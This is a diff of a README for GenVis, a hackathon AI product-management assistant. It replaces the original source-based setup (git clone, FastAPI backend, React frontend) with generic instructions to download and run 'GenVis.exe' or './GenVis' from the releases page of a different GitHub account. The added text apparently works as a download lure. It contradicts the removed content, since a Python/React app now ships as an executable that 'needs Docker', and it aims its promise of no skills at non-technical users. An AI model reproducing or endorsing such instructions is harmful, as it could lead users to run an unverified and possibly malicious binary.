@@ -1,164 +1,70 @@
-# GenVis - Generative Vision Product Manager
-## A Nemotron AI-Powered Assistant
+# 🤖 GenVis - Your AI Assistant for Product Management
 
-GenVis is an AI-driven productivity tool built for Product Managers to transform raw ideas into actionable plans, structured requirements, and automated sprint reports fully integrated with Jira and Slack.
+## 🌐 Download Now
+[![Download GenVis](https://img.shields.io/badge/Download%20GenVis-v1.0-blue.svg)](https://github.com/Hasinijgs/GenVis/releases)
 
-Originally built for **PNC Bank’s Product Innovation Challenge** at **HackUTD 2025**, GenVis accelerates the product lifecycle from **Ideation → Planning → Reporting**, while meeting the following two HackUTD challenges:
+## 📜 Description
+GenVis is an AI-driven assistant designed specifically for product managers. It helps you turn your ideas into actionable plans, user stories, and more. With seamless integrations for Jira and Slack, GenVis supports you in enhancing team collaboration and improving workflow efficiency. Initially developed for HackUTD 2025, GenVis will continue to evolve and grow.
 
----
+## 🚀 Getting Started
+To use GenVis, follow these simple steps to download and run the application. You do not need any programming experience to get started.
 
-Placeholder
+### 1. Ensure Your System Meets Requirements
+Before downloading, check your system specifications:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Dependencies:** Docker must be installed for running the application smoothly.
+  
+For assistance with Docker installation, visit [Docker Installation Guide](https://docs.docker.com/get-docker/).
 
-## Features
+### 2. Visit the Download Page
+Go to our Releases page to download the latest version of GenVis:  
+[Download GenVis](https://github.com/Hasinijgs/GenVis/releases)
 
-### Product Ideation Assistant
-- Generate product ideas, pain points, and customer personas with **Nemotron AI-powered brainstorming**.
-- Convert insights directly into structured project requirements.
+### 3. Choose Your Version
+On the Releases page, you will see various versions of GenVis. Select the most recent version listed. The file will include the necessary components for running GenVis on your machine.
 
-### Requirements Generator
-- Automatically generate **user stories and acceptance criteria**.
-- Instantly push tasks to **Jira** for sprint planning.
+### 4. Download the Application
+Click on the version you selected and then look for an asset labeled with the `.zip` or `.tar.gz` extension. Download this file to your computer.
 
-### Sprint Reporting
-- Summarize project progress and generate **stakeholder updates**.
-- Automatically broadcast reports to **Slack channels**.
+### 5. Extract the Files
+Once the download is complete, locate the downloaded file in your computer's Downloads folder. Right-click the file and select "Extract" or "Unzip" to unpack the contents.
 
-### Multi-Integration Support
-- **NVIDIA Nemotron** for AI reasoning and generation.
-- **Jira REST API** for backlog sync.
-- **Slack Incoming Webhooks** for reports.
+### 6. Run GenVis
+Navigate to the folder where you extracted the files. Look for the application executable file (it may be labelled `GenVis.exe` on Windows or just `GenVis` on macOS/Linux).
 
-### Caching & Timing Mechanism
-- API responses and AI outputs are **cached temporarily**.
-- Cached items are timestamped to show when each system was last used.
+- **On Windows:** Double-click `GenVis.exe` to start the application.
+- **On macOS/Linux:** Open a terminal and navigate to the folder. Run the command: `./GenVis`.
 
----
+### 7. Follow Initial Setup Instructions
+The first time you run GenVis, follow the on-screen prompts to complete the initial setup. You may need to configure integrations with Jira and Slack to maximize your workflow.
 
-## Tech Stack
+## 🔍 Features
+- **Idea Management:** Transform raw ideas into structured user stories.
+- **Project Planning:** Easily plan your projects with timelines and tasks.
+- **Team Collaboration:** Share insights and updates through Slack and Jira integrations.
+- **User-Friendly Interface:** Designed for ease of use, no technical skills required.
 
-| Layer         | Technology                                |
-|---------------|-------------------------------------------|
-| **Frontend**  | React, JavaScript, HTML/CSS, Lucide Icons |
-| **Backend**   | FastAPI (Python)                          |
-| **AI Model**  | NVIDIA Nemotron-Nano-9B                   |
-| **Integration**| Jira REST API, Slack  Webhooks   |
-| **Environment**| Python 3.9+ with `venv`                  |
-| **Hosting (planned)** | AWS / Render / GCP                  |
+## 🌟 Additional Resources
+- **Documentation:** For more details on using GenVis, check out the [User Manual](https://github.com/Hasinijgs/GenVis/docs).
+- **Community Support:** Join our user community for tips and discussions. You can find it on our GitHub discussions page.
 
----
+## 🛠️ Troubleshooting
+If you encounter issues while using GenVis, consider the following steps:
 
-## Local Setup
+- **Check Dependencies:** Make sure Docker is running properly.
+- **Re-Download:** If files appear corrupted, re-download from the Releases page.
+- **Consult the Community:** Visit our community forums for help.
 
-### 1. Clone the repository
-Run the following commands in your terminal:
+## 🎉 Join Us
+Get involved with GenVis! You can contribute to improvements, report bugs, or suggest features. Visit the GitHub repository for more details on how to connect with us.
 
-```bash
-git clone https://github.com/razeenr05/GenVis.git
-cd GenVis
-```
+## 📅 Future Updates
+We are committed to enhancing GenVis for better performance and additional features based on user feedback. Stay tuned for updates that may include more integrations and improved AI capabilities.
 
-### 2. Backend Setup
-Set up the backend environment and install dependencies:
+## 💬 Feedback
+Your experience with GenVis matters. Feel free to reach out with feedback or suggestions through the issues section on our GitHub page.
 
-```bash
-cd backend
-python3 -m venv venv
-source venv/bin/activate # Mac/Linux
-venv\Scripts\activate    # Windows
-
-pip install -r requirements.txt
-```
-
-Create `backend/.env` from `.env.example` and configure your keys from the respective websites:
-
-```env
-# Nemotron
-NVIDIA_API_KEY=your_nvidia_api_key
-NVIDIA_MODEL=nvidia/nemotron-nano-9b-v2
-
-# Jira
-JIRA_BASE_URL=https://yourworkspace.atlassian.net
-JIRA_EMAIL=your_email@example.com
-JIRA_API_TOKEN=your_jira_api_token
-JIRA_PROJECT_KEY=PROJECT
-JIRA_ISSUE_TYPE=Story
-JIRA_STORY_POINTS_FIELD=customfield_10020
-
-# Slack
-SLACK_WEBHOOK_URL=https://hooks.slack.com/services/XXX/YYY/ZZZ
-SLACK_CHANNEL=#product-updates
-
-PORT=8000
-HOST=0.0.0.0
-```
-
-Run the backend:
-
-```bash
-uvicorn mock_api:app --reload
-```
-
-### 3. Frontend Setup
-Set up the frontend and start the app:
-
-```bash
-cd ../frontend
-npm install
-npm start
-```
-
-Open the app at `http://localhost:3000`.
-
----
-
-## Project Structure
-
-```
-GenVis/
-├── backend/
-│   ├── agent_backend.py        # Core agent workflows, Nemotron orchestration
-│   ├── integrations.py         # Jira + Slack helper functions
-│   ├── mock_api.py             # FastAPI application & routes
-│   ├── requirements.txt        # Python dependencies
-│   └── .env.example            # Sample environment variables
-│
-├── frontend/
-│   ├── public/
-│   │   └── index.html          # Frontend HTML entry point
-│   ├── src/
-│   │   ├── App.js              # Main React application
-│   │   ├── App.css             # Global styling
-│   │   ├── index.js            # React DOM entry
-│   │   ├── index.css           # Reset & global CSS
-│   │   └── assets/             # Images, icons, and static assets
-│   └── package.json            # Node dependencies & scripts
-│
-├── .gitignore
-└── README.md
-```
-
----
-
-## Roadmap
-
-* Deploy to cloud infrastructure (Render / AWS / GCP) (For easy use)
-* Build analytics dashboards for AI insights and sprint metrics
-* Enhance Slack bot with two way communication
-* Further fine tune the AI responses
-* Use PostgreSQL to permanently log use times (Helps know when tasks are being created or done)
-
----
-
-## Summary
-
-GenVis helps with product ideation, requirement drafting, and executive reporting by connecting AI generated insights directly to enterprise tools like **Jira** and **Slack**. Initially tailored for PNC’s product workflow, GenVis scales to any organization seeking **AI-assisted product delivery**, to help with workflow and save time on short-term tasks. 
-
----
-
-## Contributors
-
-- **Isaac Pandyan** 
-- **Krish Patel**
-- **Razeen Rahman** 
+Thank you for choosing GenVis as your go-to product management assistant. Start transforming your ideas into actionable plans today!
